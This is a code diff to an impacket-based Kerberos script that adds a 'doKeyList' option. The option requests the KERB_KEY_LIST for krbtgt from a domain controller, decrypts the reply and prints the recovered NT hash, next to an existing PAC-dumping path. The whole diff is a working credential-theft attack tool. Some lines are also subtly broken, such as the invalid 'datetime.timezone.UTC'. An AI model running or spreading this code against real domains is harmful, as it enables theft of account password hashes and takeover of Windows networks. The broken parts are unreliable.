@@ -28,10 +28,10 @@ import os
 import struct
 import sys
 from binascii import unhexlify, hexlify
-from six import b
 
-from pyasn1.codec.der import decoder, encoder
-from pyasn1.type.univ import noValue
+
+from pyasn1.type.univ import noValue, SequenceOf, Integer
+from pyasn1.codec.der import encoder, decoder
 
 from impacket import version
 from impacket.krb5.ccache import CCache
@@ -41,7 +41,7 @@ from impacket.examples import logger
 from impacket.examples.utils import parse_credentials
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
-    EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1
+    EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, EncTGSRepPart, KERB_KEY_LIST_REP
 from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, Enctype
 from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
 from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO, PAC_CLIENT_INFO_TYPE, PAC_CLIENT_INFO, \
@@ -97,7 +97,7 @@ class GETPAC(object):
         self.__kdcHost = options.dc_ip
         self.__asrep_key = options.key
 
-    def dump(self):
+    def dump(self, doKeyList=False):
         # Try all requested protocols until one works.
 
         # Do we have a TGT cached?
@@ -141,7 +141,7 @@ class GETPAC(object):
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
-        now = datetime.datetime.utcnow()
+        now = datetime.datetime.now(datetime.timezone.UTC)
         authenticator['cusec'] = now.microsecond
         authenticator['ctime'] = KerberosTime.to_asn1(now)
 
@@ -174,22 +174,34 @@ class GETPAC(object):
         tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
         tgsReq['padata'][0]['padata-value'] = encodedApReq
 
+        if doKeyList:
+            tgsReq['padata'][1] = noValue
+            tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
+            encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
+            tgsReq['padata'][1]['padata-value'] = encodedKeyReq
+
         reqBody = seq_set(tgsReq, 'req-body')
 
         opts = list()
         opts.append( constants.KDCOptions.forwardable.value )
         opts.append( constants.KDCOptions.renewable.value )
         opts.append( constants.KDCOptions.canonicalize.value )
-        opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
+        if not doKeyList:
+            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
 
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
         serverName = Principal(self.__username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
-
-        seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        if not doKeyList:
+            seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        else:
+            serverName = Principal("krbtgt", type=constants.PrincipalNameType.NT_SRV_INST.value)
+            reqBody['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
+            reqBody['sname']['name-string'][0] = serverName
+            reqBody['sname']['name-string'][1] = str(decodedTGT['crealm'])
         reqBody['realm'] = str(decodedTGT['crealm'])
 
-        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        now = datetime.datetime.now(datetime.timezone.UTC) + datetime.timedelta(days=1)
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
@@ -197,16 +209,17 @@ class GETPAC(object):
                       (int(cipher.enctype),int(constants.EncryptionTypes.rc4_hmac.value)))
 
         myTicket = ticket.to_asn1(TicketAsn1())
-        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
-        if logging.getLogger().level == logging.DEBUG:
-            logging.debug('Final TGS')
-            print(tgsReq.prettyPrint())
+        if not doKeyList:
+            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Final TGS')
             print(tgsReq.prettyPrint())
 
         message = encoder.encode(tgsReq)
-        logging.info('Requesting ticket to self with PAC')
+        if doKeyList:
+            logging.info('Upgrading to full TGT with NT hash recovery')
+        else:
+            logging.info('Requesting ticket to self with PAC')
 
         r = sendReceive(message, self.__domain, self.__kdcHost)
 
@@ -225,16 +238,23 @@ class GETPAC(object):
 
         newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
 
+        if doKeyList:
+            encTGSRepPart = tgs['enc-part']
+            enctype = encTGSRepPart['etype']
+            cipher = _enctype_table[enctype]
 
-
-        try:
-            # If is was plain U2U, this is the key
-            plainText = newCipher.decrypt(key, 2, str(cipherText))
-        except:
-            # S4USelf + U2U uses this other key
+            # keyAuth = Key(cipher.enctype, bytes(sessionKey))
+            decryptedTGSRepPart = cipher.decrypt(sessionKey, 8, encTGSRepPart['cipher'])
+            decodedTGSRepPart = decoder.decode(decryptedTGSRepPart, asn1Spec=EncTGSRepPart())[0]
+            encPaData1 = decodedTGSRepPart['encrypted_pa_data'][0]
+            decodedPaData1 = decoder.decode(encPaData1['padata-value'], asn1Spec=KERB_KEY_LIST_REP())[0]
+            key = decodedPaData1[0]['keyvalue'].prettyPrint()
+            print('Recovered NT hash:')
+            print(key[2:])
+        else:
             plainText = cipher.decrypt(sessionKey, 2, cipherText)
-        specialkey = Key(18, unhexlify(self.__asrep_key))
-        self.printPac(plainText, specialkey)
+            specialkey = Key(18, unhexlify(self.__asrep_key))
+            self.printPac(plainText, specialkey)
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -244,7 +264,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
     parser.add_argument('identity', action='store', help='domain/username')
-    parser.add_argument('-key', action='store', required=True, help='AS REP key from gettgtpkinit.py')
+    parser.add_argument('-key', action='store', help='AS REP key from gettgtpkinit.py')
+    parser.add_argument('-doKeyList', action='store_true', help='Use key list to recover NT hash')
     parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                        'ommited it use the domain part (FQDN) specified in the target parameter')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -270,7 +291,7 @@ if __name__ == '__main__':
 
     try:
         dumper = GETPAC(username, domain, options)
-        dumper.dump()
+        dumper.dump(options.doKeyList)
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
